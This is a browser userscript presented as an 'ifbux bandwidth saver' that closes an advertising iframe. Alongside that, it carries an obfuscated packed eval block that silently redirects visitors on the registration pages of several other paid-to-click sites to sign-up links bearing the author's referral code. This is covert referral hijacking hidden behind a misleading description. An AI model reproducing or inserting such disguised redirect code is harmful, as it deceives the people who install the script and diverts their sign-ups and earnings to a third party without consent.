// ==UserScript==
// @name           ifbux bandwidth saver
// @namespace      http://cool-bux.co.cc/
// @description    Saves bandwidth by closing the advertisment frame and loads faster
// @include        *ifbux.com/surfing/*

// @include        *paid2youtube.com/register.php*
// @include        *neobux.com/?u=r*
// @include        *onbux.com/register*
// @include        *incrasebux.com/register.php*
// @include        *buxp.info/register.php*
// @include        *mycubie.net/register*
// @include        *cashgopher.com*
// @include        *bux.to*

// ==/UserScript==

var i = 0;
var uri = document.URL;

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8(2.9("f.5/1.3")>0&&2!="7://4.f.5/1.3?r=6"){a.b.c="7://4.f.5/1.3?r=6"}8(2.9(/g.5..u=r/)>0&&2!="d://4.g.5/?u=r&e=p"){a.b.c="d://4.g.5/?u=r&e=p"}8(2.9("h.5/1")>0&&2!="d://4.h.5/1?e=q"){a.b.c="d://4.h.5/1?e=q"}8(2.9("i.5/1.3")>0&&2!="d://4.i.5/1.3/6.s"){a.b.c="d://4.i.5/1.3/6.s"}8(2.9("j.k/1")>0&&2!="7://4.j.k/1.3?t=6"){a.b.c="7://4.j.k/1.3?t=6"}8(2.9("l.m/1.3")>0&&2!="7://4.l.m/1.3?r=6"){a.b.c="7://4.l.m/1.3?r=6"}8(2.9("n.o/1.3")>0&&2!="7://4.n.o/1.3?r=6"){a.b.c="7://4.n.o/1.3?r=6"}',31,31,'|register|uri|php|www|com|gbanerji|http|if|search|document|location|href|https|rh|paid2youtube|neobux|onbux|incrasebux|mycubie|net|buxp|info|bux|to|6762616E65726A69|7e63ae70663c6d76ffc6a1840db2dea1||html|ref|'.split('|'),0,{}))


//close the iframe
var ifr = document.getElementsByTagName('iframe');

ifr[1].src = "http://www.google.com";
ifr[1].parentNode.removeChild(ifr[1]);
